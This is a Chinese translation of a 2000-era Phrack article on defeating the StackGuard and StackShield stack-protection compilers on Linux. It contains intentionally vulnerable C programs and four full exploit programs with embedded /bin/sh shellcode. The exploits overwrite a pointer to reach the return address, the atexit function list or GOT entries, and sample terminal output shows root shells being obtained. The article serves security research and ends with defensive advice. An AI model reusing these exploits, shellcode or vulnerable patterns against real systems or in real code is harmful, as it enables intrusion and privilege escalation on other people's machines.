@@ -1,0 +1,663 @@
+作者：Bulba / Kil3r (lam3rz@hert.org)
+整理：Warning3 (warning3@nsfocus.com)
+主页：http://www.nsfocus.com
+日期：2000-05-05
+
+<* 译者的话：
+
+       这篇文章是从<< Phrack >>56期摘出来的，文中所描述的溢出方式当然是有
+       很多局限性的，只有在某些特定条件下才能发生。但是读了仍然感觉有些
+       收获，至少可以开阔思路。因此我决定翻译一下，错误之处，还请指正。
+       
+       另：StackGuard还是一个很不错的安全工具，值得一试。下载地址在后面
+       的附录中有，目前最新的版本是StackGuard 1.21。
+       
+       本文中所有的程序都在RedHat 5.2下，使用gcc-2.7.2.3-14_SGc2_SG12.i386.rpm
+       (StackGuard 1.2 Random canary Protection)版本验证通过。 
+
+*>
+
+----|  前言
+
+
+这篇文章试图描述这样一个事实，在使用了StackGuard 或者 StackShield的Linux
+系统中，利用堆栈溢出进行攻击仍然是可能的，即使这个系统同时也打上了不可执行
+堆栈的补丁。
+
+
+
+----| StackGuard 概述
+
+援引StackGuard作者的话，StackGuard是一种"用轻微的性能损失来消除堆栈溢出问
+题的编译器技术". [1]
+
+我们假设读者已经知道缓冲区溢出攻击的工作原理以及如何写攻击代码。如果这对你
+来说仍然是陌生的，请先阅读< P49-14的内容。
+
+通常我们可以通过往一个局部变量的buffer中输入大量数据来修改函数的返回地址，
+这样做的结果是我们将破坏或者修改被溢出的buffer往后(堆栈高址方向)的所有数据。
+
+StackGuard会做什么呢？它将一个"canary"值(一个单字)放到返回地址的前面，如果
+当函数返回时，发现这个canary的值被改变了，就证明可能有人正在试图进行缓冲区
+溢出攻击，程序会立刻响应，发送一则入侵警告消息给syslogd,然后停止工作。
+
+
+
+看下面的图例：
+
+高址    ...                    ...
+     |-----------------------------------|
+     | 传递给函数的参数                   |
+     |-----------------------------------|
+     | 函数的返回地址 (RET)               | 
+     |-----------------------------------|
+     | canary                            |
+     |-----------------------------------|
+     | 保存的栈帧指针 (%ebp)              |
+     |-----------------------------------|
+     | 局部变量                           |
+     |-----------------------------------|
+    ...                    ...
+低址
+
+为了使这种保护机制有效，就不能给攻击者在攻击字符串中夹杂伪造canary值的机
+会，StackGuard提供了两种技术来保证攻击者不能伪造canary值："终止符"和"随机
+数".
+
+一个终止符canary包含:NULL(0x00), CR (0x0d), LF (0x0a) 和 EOF (0xff)四个字
+符，它们应该可以阻止大部分的字符串操作，使溢出攻击无效。
+
+一个随机数canary在程序执行的时候被产生。所以攻击者不能通过搜索程序的二进制
+文件得到canary值。如果/dev/urandom存在，随机数就从那里取得。否则，就从通过
+对当前时间进行编码得到。其随机性足以阻止绝大部分的预测攻击。
+
+
+----|  StackShield 概述
+
+
+StackShield使用了另外一种不同的技术。它的做法是创建一个特别的堆栈用来储存
+函数返回地址的一份拷贝。它在受保护的函数的开头和结尾分别增加一段代码，开头
+处的代码用来将函数返回地址拷贝到一个特殊的表中，而结尾处的代码用来将返回地
+址从表中拷贝回堆栈。因此函数执行流程不会改变，将总是正确返回到主调函数中。
+由于没有比较堆栈中的返回地址与保存的是否相同，因此并不能得知是否发生了堆栈
+溢出。在最新的版本中已经增加了一些新的保护措施，当调用一个地址在非文本段内
+的函数指针时，将终止函数的执行。
+
+
+看起来好像使用了这两种工具，系统就安全了，其实并不是这样。
+
+
+----|  "Nelson Mengele must be free"
+
+" ... 攻击者可以利用溢出改变函数指针来绕过StackGuard的保护，例如函数指针和
+longjmp buffers(它甚至可以不在堆栈中)." [2]
+
+OK. 看起来我们需要运气好才能覆盖一个函数指针或者lognjmp,因为我们的buffer后
+面并不总是经常跟着一个函数指针，很多程序甚至根本不使用它们。而更常见的是这
+样一些指针。例如：
+
+[root@linuxtext SG]# cat vul.c 
+
+// 一个有弱点的例子程序
+
+int f (char ** argv)
+{
+        int pipa;    // 无用的变量
+        char *p;        // 我们要利用的指针
+        char a[30];     // 我们要覆盖的buffer
+
+        p=a;            // 将指针指向buffer a
+
+        printf ("p=%x\t -- before 1st strcpy\n",p);
+        strcpy(p,argv[1]);        // 有问题的 strcpy()
+        printf ("p=%x\t -- after 1st  strcpy\n",p);
+        strncpy(p,argv[2],16);    // 好像没有问题的strncpy()
+        printf("After second strcpy ;)\n");
+}
+
+main (int argc, char ** argv) {
+        f(argv);
+        execl("back_to_vul","",0);  // 这个execl将会失败
+        printf("End of program\n");
+}
+
+
+我们知道，我们只能通过溢出buffer来覆盖返回地址。但是既然我们的程序受到
+StackGuard的保护，这样做肯定是行不通的。但是最简单或者最明显的办法并不
+一定是最好的解决办法。我们如果覆盖字符指针'p'将会怎么样呢？第二个strncpy
+将会直接将argv[2]后的16个字节拷贝到我们所指定的内存中去。而如果'p'指向
+堆栈中函数的返回地址呢？那就意味着我们可以修改返回地址中的内容，而且根
+本不会碰到canary的内容。
+
+因此让我们看看要完成攻击需要做那些工作：
+
+
+1. 我们需要有一个指针p，它在堆栈中要处在我们的buffer a[]的后面
+2. 我们需要有个溢出问题，允许我们覆盖p指针的内容
+3. 我们还需要一个*copy()(strcpy,memcpy或者其他)操作,将以*p为目的地址，而
+   将用户输入数据作为源地址。并且在溢出和第二次拷贝之间，p不会被重新初始
+   化。
+
+显然，不是所有用StackGuard编译的程序都满足上面的条件。但是这样的程序确实
+存在。例如，wu-ftpd 2.5的mapped_path漏洞就是一个例子。覆盖mapped_path将
+改变Argv和LastArg指针（它们被setproctitle()用到),这将导致可以修改进程内存
+的任意部分。当然这是基于数据段的溢出(不是基于堆栈的).但是，这也说明满足我
+们条件的程序在现实世界中是确实存在的。
+
+
+我们将要怎么攻击它呢?
+
+我们首先覆盖指针'p',让它指向堆栈中的返回地址(RET),这样下一个*copy()将会覆
+盖我们的RET地址而根本不会碰到canary。:-) 当然我们需要事先放好我们的
+shellcode.(我们使用argv[0]来储存它).这里有一个简单的例子，(我们使用execle()
+来让环境变量的地址固定)
+
+
+[root@linuxtext SG]# cat ex.c
+
+/* Example exploit no. 1 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+
+char buf[37];  // 原文中是buf[36]
+int * p;
+
+main() {
+    memset(buf,'A',32);  // 填充32个'A'覆盖a[32]
+    p = (int *)(buf+32); // 指向buf+32
+    *p=0xbffffeb4;     // 用真实的RET覆盖p指针
+    buf[36]='\0';        // 原文没有加这条，导致拷贝时出错
+    p = (int *)(addr);   // 指向addr起始地址
+    *p=0xbfffff9b;     // 用新的返回地址覆盖(这个地址是固定的，位于环境变量区)
+                  // argv[0],argv[1],argv[2]  
+    execle("./vul",shellcode,buf,addr,0,0);
+}
+
+
+在一个使用了StatckGuard的RH 5.2 Linux系统下使用：
+
+    [root@linuxtext SG]# gcc vul.c -o vul
+    [root@linuxtext SG]# gcc -o ex ex.c
+    [root@linuxtext SG]# ./ex
+    p=bffffec4       -- before 1st strcpy
+    p=bffffeb4       -- after 1st  strcpy
+    bash#
+
+我们能看到，第一个strcpy()覆盖了p,第二个strncpy()将新的返回地址RET拷贝到当
+前的返回地址中，所以当函数返回时就跳到我们的shellcode中运行了。
+这个程序中的方法对用通常的gcc或者StackGuard gcc编译的vul都是可以成功的,但是
+对于使用StackShield编译的程序就无效了。
+
+
+
+----|  There is no spoon
+
+我同Crispin Cowan 谈了到了这个问题，他是StackGuard的
+主要开发者之一，他提出了一个针对这个问题的解决的方法，下面就是他说的话：
+
+" 使用异或随机Canary防御方法：在这里，我们使用Aaron Grier原来提出的将返回
+地址与随机canary异或的方法。当函数退出的时候，校验canary值的代码将用一个正
+确的随机canary(这个值在函数执行的时候产生)与返回地址进行异或计算，将得到的
+值与保存在堆栈里的值进行比较。如果攻击者修改了返回地址，那么异或后的值肯定
+是不匹配的。如果不知道随机的canary值，攻击者就不能计算放在堆栈中的carnary
+值，这是一种使用随机canary对返回地址加密的有效方法.
+
+这里的主要问题是防止攻击者算出随机canary值。过去我们的做法是通过在一个canary
+表中随机挑选值，以致于缓冲区溢出时不能得到确切的canary值。然而,Emsi的攻击方
+法可以让他修改任意地址的内容"
+
+(最简单的解决方法是)"用mprotect()保护canary表不可写，阻止攻击者修改canary表"
+
+
+我们告诉Crispin我们将要写一篇关于这种攻击的文章，他回复说:
+
+" 我认为我们可以推出一个修订版的StackGuard编译器(使用XOR 随机canary)，准备
+在星期一发布."
+
+现在这个版本的编译器已经发布了。[3]
+
+
+StackShield提供了几乎同等级别的安全保护，它将RET放在一个安全的地方(任意位置
+和大小，这可能并不是一个好主意),并在返回之前检查它的完整性。
+
+
+我们同样可以绕过它。
+
+如果我们有一个可以控制的指针，我们可以用它覆盖能帮我们完成溢出攻击的任意地
+址的内容。例如，控制fnlist结构，它包含通过atexit(3) 或者 on_exit(3)注册的函
+数。为了执行这里的代码，我们的程序当然必须调用exit(),但是，大部分的程序在执
+行结束时或者当错误发生时会执行这个函数(在大多数情况下，我们可以强制它产生一
+个错误).
+
+<* 译者注： 其实在<_start>函数中，在调用完main()函数后，后面总是会调用exit()
+   因此，即使程序正常完成，也会去执行我们的shellcode.
+   例如：   
+   <...>
+   0x8048680 <_start+52>:  popl   %eax
+   0x8048681 <_start+53>:  call   0x8048764 
+   0x8048686 <_start+58>:  pushl  %eax
+   0x8048687 <_start+59>:  call   0x804861c 
+   0x804868c <_start+64>:  hlt    
+   0x804868d <_start+65>:  nop    
+   <...>
+*>
+让我们看看fnlist结构的内容是怎样的：
+
+
+    [root@linuxtext SG]# gdb ./vul                                                                 
+    GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support                            
+    [...]                                                                                          
+    This GDB was configured as "i386-redhat-linux"...                                              
+    (gdb) b main                                                                                   
+    Breakpoint 1 at 0x8048764                                                                      
+    (gdb) r                                                                                        
+    Starting program: /root/SG/./vul                                                               
+                                                                                                   
+    Breakpoint 1, 0x8048764 in main ()                                                             
+    (gdb) x/10x &fnlist                                                                            
+0x400a2424 :    0x00000000      0x00000002      0x00000003      0x40005d10             
+0x400a2434 : 0x00000000      0x00000003      0x080488e0      0x00000000             
+0x400a2444 : 0x00000000      0x00000000                                             
+
+
+我们可以看到它调用两个函数：_fini [0x080488e0]和_dl_fini[0x40005d10]并且这
+两个函数都不需要参数(你可以看glibc的源码来理解怎么看fnlist的内容)。我们可以
+覆盖其中任意一个函数的地址。fnlist的地址与libc库有关，所以在同一台主机上，
+每个进程对应的地址是同样的。
+
+下面的代码用来攻击一个溢出漏洞（当程序通过exit()退出的时候):
+
+
+[root@linuxtext SG]# cat 3ex.c 
+/* Example exploit no. 2 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+
+char buf[37];
+int * p;
+
+main() {
+    memset(buf,'A',32);
+    p = (int *)(buf+32);
+    *p=0x400a243c;    // <<== fnlist结构中我们要修改的地址(_fini)
+    buf[36]='\0';
+    p = (int *)(addr);
+    *p=0xbfffff9b;    // <<== 我们要调用的新函数的地址(shellcode的起始地址)
+    execle("./vul",shellcode,buf,addr,0,0);
+}
+
+你能发现其实我们的程序只是改动了一个地址而已 :)
+让我们来测试一下吧：
+
+
+    [root@linuxtext SG]# gcc -o ex ex.c
+    [root@linuxtext SG]# ./ex
+    p=bffffec4       -- before 1st strcpy
+    p=400a243c       -- after 1st  strcpy
+    After second strcpy ;)   
+    End of program           <---- 注意，这里main()正确退出了
+    bash# 
+
+我们可以看到当程序正常执行完毕后给了我们一个shell.不管是StackGuard还是
+StackShield都不能防止这种攻击。
+
+但是如果我们的程序不调用exit()而是使用_exit()呢？
+让我们看看如果我们覆盖了canary会发生什么。一个用StackGuard编译的程序会调用
+__canary_death_handler()函数来记录溢出尝试并中止进程的执行。让我们看一看：
+
+
+    void __canary_death_handler (int index, int value, char pname[]) {
+      printf (message, index, value, pname) ;
+      syslog (1, message, index, value, pname) ;
+      raise (4) ;
+      exit (666) ;
+    }
+
+我们发现在结尾处有一个对exit()的调用。当然，攻击这个程序将会产生一个记录，
+但是如果没有其它办法，这也不得不做的了。而如果你获得了root,就可以清除这些
+记录了。
+
+我们收到了Perry Wagle (另一个Stackguard的作者)发来的几
+封email:"我好象忘记让它调用_exit()了".现在StackGuard调用_exit().
+
+
+当然当前上述攻击对StackShield无效。StackShield保护可以通过覆盖被保存的%ebp
+来绕过，它并不受保护。klog在Phrack 55 [4]的"覆盖栈帧指针"中详细描述了这种攻
+击手段。使用StackShield的'-z d'选项编译的程序会调用_exit(),但这对我们并没有
+什么意义。
+
+
+
+----|  Discovering the America
+
+如果一个系统受到StackGuard和StackPatch(Solar Designer的堆栈不定使堆栈不可
+执行)保护又如何?这是最糟的情况吗？并不完全是的.
+
+在上面讲的办法都无效的情况下，我们找到了另外一种聪明的方法来绕过堆栈保护。
+
+读者可能会想到Rafal Wojtczuk的那篇很棒的文章"Defeating Solar Designer's 
+Non-executable Stack Patch"(可以参看<<绕过Linux下不可执行堆栈保护>>一文)
+他提出了一个很好的思路就是修改全局偏移表(GOT),既然我们的程序可以构造任意
+的指针，为什么不将它指向GOT呢？
+
+让我们开动脑筋，看看有问题的程序：
+
+
+        printf ("p=%x\t -- before 1st strcpy\n",p);
+        strcpy(p,argv[1]);
+        printf ("p=%x\t -- after 1st  strcpy\n",p);
+        strncpy(p,argv[2],16);
+        printf("After second strcpy :)\n");
+
+这个程序将(argv[2])的内容到我们的指针所指向地址，然后执行库函数printf(),
+我们需要做的就是用libc中system()的地址来覆盖GOT中printf()的地址，因此它
+就会执行system("After second strcpy :)\n");,让我们实际来测试一下。
+我们先反汇编一下printf()的过程链接表：
+
+    [root@linuxtext SG]# gdb ./vul
+    GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+    [...]
+    This GDB was configured as "i386-redhat-linux"...
+    (gdb) x/2i printf
+    0x804858c :     jmp    *0x8049a28 <--- printf()的GOT入口地址
+    0x8048592 :   pushl  $0x8
+    (gdb) 
+
+
+因此我们知道printf()的GOT入口在0x8049a28,我们要做的就是将libc system()的
+地址放到这个地址。我们可以算出system()的地址在：0x40010000+0x2b070. 0x2b070
+是__libc_system()在libc库中的偏移地址：
+    
+
+
+    [root@linuxtext SG]# nm /lib/libc.so.6| grep system
+    0002b070 T __libc_system                           
+    000854b0 T svcerr_systemerr                        
+    0002b070 W system                                  
+
+[ 注意：读者可能注意到我们这里没有使用打了Solar Designer patch的内核。
+因为我们在安装时碰到一些问题。由于急着写完这篇文章，我们决定在没有内核
+补丁的情况下来测试一下。所有不同的是地址开头的0x40值将变成0x00,例如：
+0x00XXYYZZ.因此上述地址就应该是这样：0x00010000+0x2b070.在开头的0x00
+将会中止我们的字符串。我们并不能%100保证堆栈补丁与StackGuard完全兼容。
+如果任何人知道确切答案，请告诉我们.]
+
+
+好，现在让我们测试下列程序：
+
+
+[root@linuxtext SG]# cat 3ex3.c
+/* Example exploit no. 3 (c) by Lam3rZ 1999 :) */
+
+char *env[3]={"PATH=.",0}; /* 设置PATH为当前路径 */
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+char buf[37];
+int * p;
+
+main() {
+    memset(buf,'A',36);
+    p = (int *)(buf+32);
+    *p++=0x8049a28;//  <== printf() 的GOT 入口地址
+    buf[37]='\0';
+    p = (int *)(addr);
+    *p=0x40010000+0x2b070;//  <<== libc system()的地址
+    printf("Exec code from %x\n",*p);
+    execle("./vul",shellcode,buf,addr,0,env);
+}
+
+再来测试一下！！！
+
+
+    [root@linuxtext SG]# gcc -o 3ex3 3ex3.c               
+    [root@linuxtext SG]# ./3ex3
+    Exec code from 4003b070                               
+    p=bffffec4       -- before 1st strcpy                 
+    p=8049a28        -- after 1st  strcpy                 
+    sh: syntax error near unexpected token `;)'           
+    sh: -c: line 1: `After second strcpy ;)'              
+    Segmentation fault (core dumped)                      
+    
+                                               
+不幸的是，当system()执行的时候，我们的printf()字符串里包含特殊的shell字符。
+因此，程序会报错。而在大多数的情况下，如果我们修改printf()去执行system()
+，通常会执行类似这样的命令"Here we blah, blah and blah",所以我们只需要在我
+们当前工作目录下放一个名为"Here"的程序，它来执行我们所需要的命令。
+
+那怎么处理这里这个不被shell接受的':)'字符呢？
+
+
+如果我们幸运的话：我们的a[] buffer是f()中最后的局部变量，那么，当溢出发生后
+执行下一个函数(例如printf())时,会先将参数放入堆栈中，然后执行我们的__libc_
+system(),这时候这个参数紧挨着我们的a[]的第一个字节。如果我们设法让__libc_sys
+tem()跳过压入canary值的动作，会发生什么事呢？我们将返回地址设成__libc_system()
++5,这样就跳过了压入canary的动作，这样本来第一个参数应该在(%ebp+12)处，现在实际
+上真正的第一个参数在(%ebp+8)处，__libc_system()仍会将(%ebp+12)处的内容当成它的
+第一个参数，而实际上这就是我们的a[]的第一个字节。我们完全可以在里面放入一个地址
+，让它指向"/bin/sh"字符串或者其它类似的字符串。
+
+覆盖GOT的方法对StackGuard, StackShield 和StackPatch。当我们不能处理我们所拷贝
+的全部内容，而只能对其中的一部分进行操作时，可以使用这种方法。(就象在wu-ftpd
+中那样)
+
+
+----|  "Oily way"
+
+读者可能会认为我们只用了一些很简单的例子，在现实中很难找到这样的例子。你更常见
+到的函数例子可能是这样的：
+
+
+int f (char *string) {
+[...]
+    char *p;
+    char a[64];
+[...]
+
+
+检查一下下面的例子：
+
+char dst_buffer[64]; /* 最终的目标地址 */
+
+int f (char * string)
+{
+    char *p;
+    char a[64];
+
+    p=dst_buffer;        /* 初始化指针 */
+    printf ("p=%x\t -- before 1st strcpy\n",p);
+    strcpy(a, string);      /* 将string拷贝到a[]中 */
+
+    /* parsing, copying, concatenating ... black-string-magic */
+    /* YES, it MAY corrupt our data */
+
+    printf ("p=%x\t -- after 1st  strcpy\n",p);
+    strncpy(p, a, 64);      /* 将a[]中的内容拷贝到p所指向的地址 */
+    printf("After second strcpy ;)\n");
+}
+
+int main (int argc, char ** argv) {
+    f(argv[0]);                    /* interaction */
+    printf("End of program\n");
+}
+
+
+我们看到这个例子中，只传递了一个参数给有问题的函数。
+如果我们所在的系统有不可执行堆栈的补丁，库函数被映射到某些特殊地址（包含NUL
+L),怎么办？我们不能用我们在堆栈中的地址修改GOT表，因为堆栈是不可执行的。
+
+
+好象我们没有办法了，但别着急，既然我们的系统是基于x86的，它并不能对特定的内
+存页进行不可执行保护。看一下进程映象(/proc/*/maps)：
+
+
+    00110000-00116000 r-xp 00000000 03:02 57154
+    00116000-00117000 rw-p 00005000 03:02 57154
+    00117000-00118000 rw-p 00000000 00:00 0
+    0011b000-001a5000 r-xp 00000000 03:02 57139
+    001a5000-001aa000 rw-p 00089000 03:02 57139
+    001aa000-001dd000 rw-p 00000000 00:00 0
+    08048000-0804a000 r-xp 00000000 16:04 158
+    0804a000-0804b000 rw-p 00001000 16:04 158      <-- 这里是GOT的地址
+    bfffd000-c0000000 rwxp ffffe000 00:00 0
+
+尽管看起来GOT好象是不可执行的，但是实际上Intel x86芯片是允许它执行的！所以
+我们只要将我们的shellcode放到这里，然后修改GOT入口，将其指向这里就成了！
+
+
+我们只需要对我们原来的程序做一些小改动就行了
+
+
+    *p=0x8049a28;        // strncpy()的目标地址
+    [...]
+    *p=0x8049a28+4;        // 我们shellcode要被放到的地址
+
+
+我们所有要做的就是执行一个拷贝操作将我们的shellcode放到正确的地方。这里我们
+的shellcode并没有进行长度优化，所以它超过了40字节。如果你聪明的话，你可以
+让这段代码更小，既然你已经知道了确切的目的地址，就可以不再使用jmp,call,popl
+等指令了。
+
+我们担心的另一件事是信号。信号处理函数试图使用GOT入口调用函数，可能导致程序
+死掉。但这只是一个理论上的危险。
+
+现在让我们再改动一下弱点程序，使它更象真实的例子：
+
+/*  vul2.c */
+
+char global_buf[64];
+
+int f (char *string, char *dst)
+{
+        char a[64];
+
+        printf ("dst=%x\t -- before 1st strcpy\n",dst);
+        printf ("string=%x\t -- before 1st strcpy\n",string);
+        strcpy(a,string);  // 将string拷贝到a[]中
+        printf ("dst=%x\t -- after 1st  strcpy\n",dst);
+        printf ("string=%x\t -- after 1st  strcpy\n",string);
+
+        // 对我们提供的字符串进行一些处理
+
+        strncpy(dst,a,64); //将a[]中的字符串拷贝到dst(global_buf)中
+        printf("dst=%x\t -- after second strcpy :)\n",dst);
+}
+
+main (int argc, char ** argv) {
+
+        f(argv[1],global_buf);
+        execl("back_to_vul","",0);  //<-- The exec that fails
+                                    // I don't have any idea what it is for
+                    // :)
+        printf("End of program\n");
+}
+
+
+
+在这个例子中我们的指针dst在堆栈中位于canary和返回地址的高址方向，所以我们
+不得不要改变canary和返回地址的值了。
+
+StackGuard和StackShield都会检查是否函数返回时RET被改变了。在大多数的情况下
+，我们在返回前仍有足够的时间来取得问题函数的控制权。我们所要做的就是，覆盖
+下一个要调用的库函数的GOT入口地址。这样在从问题函数返回前，我们已经可以取
+得控制权了。我们就不必在乎是不是改变了canary的值了。
+
+下面是测试程序：
+
+
+/* Example exploit no. 4 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] = // 48 字节 :)
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+
+char buf[100];
+int * p;
+
+main() {
+    memset(buf,'A',100);
+    memcpy(buf+4,shellcode,48); // 前4个字节留着填shellcode的地址
+    p = (int *)(buf+80);    // <=- 距离f()第二个参数的偏移: 64+4+4+4+4
+    *p=0x8049a88;//  <<== printf()的GOT入口地址
+
+    p = (int *)(buf);
+    *p=0x8049a88+4;//  <<== GOT入口地址+4,这里是我们的shellcode起始地址
+
+    execle("./vul2","vul2",buf,0,0);
+}
+
+测试一下：
+
+    [root@linuxtext SG]# gcc -o ex4 ex4.c
+    [root@linuxtext SG]# ./ex4           
+    dst=8049b60      -- before 1st strcpy
+    string=bfffff01  -- before 1st strcpy
+    dst=8049a88      -- after 1st  strcpy
+    string=41414141  -- after 1st  strcpy
+    bash#                                
+
+
+----|  总论
+
+1) 在某些偶然发生的溢出情况下，StackGuard/StackShield可以保护你，但是它们
+   并不能阻止一个程序员的愚蠢。尽管人都会犯错误，但是一个安全程序员还必须
+   是一个了解安全的人。
+
+2) - 审核你自己的代码 - 你可能浪费一些时间，但这肯定会增强你写的程序
+     的安全性   
+   - 使用StackGuard/StackShield等类似的工具 - 可能会降低一点系统性能，
+     但同时也带来了某种程度的安全保护  
+   - 对你的程序不做任何保护工作 - 别人可能攻击你代码中的溢出漏洞来羞辱你，
+     你将会冒这种风险，如果真的发生了这种事，也是你自找的。  
+
+因此，要么自己做的完美一些，要么用安全工具来保护你的程序，要么就等着别人嘲笑
+你吧.
+
+我们欢迎任何有建设性的意见和改进。你可以通过Lam3rZ mailing list
+来与我们联系。   
+
+
+是的，我们知道，还没有真正的攻击程序。:( 但我们正在寻找，请关注这两个链接:
+
+        http://emsi.it.pl/
+和
+        http://lam3rz.hack.pl/
+
+
+----|  其他的话: Jan 5, 2000
+
+我们解决了在打了Solar Designer的不可执行堆栈补丁的系统上使用StackGuard的问
+题。我们并不肯定到底是什么原因导致问题的产生。但是为了避免发生这些问题，在
+内核设置中使能'Autodetect GCC trampolines' 和 'Emulate trampoline calls'设
+置项。我们在一个堆栈不可执行，但没使能trampolines选项的Slackware下使用Stack
+Guard是正常的，但在这样的配置在一个完全用StackGuard编译过的RedHat Linux下就
+不能正常工作... :)
+
+
+----|  感谢
+
+A18 team, HERT, CocaCola, Raveheart (for "Nelson Mengele..." song).
+Nergal, mo縠 by?si?tak ujawni? ;)
+Po raz kolejny chcialbym zaznaczyc, ze jestem tylko zwyczajnym Lam3rem.
+                                                                     
+    - Kil3r
+
+people I've been drinking with - because i've been drinking with you :)
+people I'd like to drink with  - because i will drink with you :) 
+people smarter than me         - because you're better than I am
+∑剩延
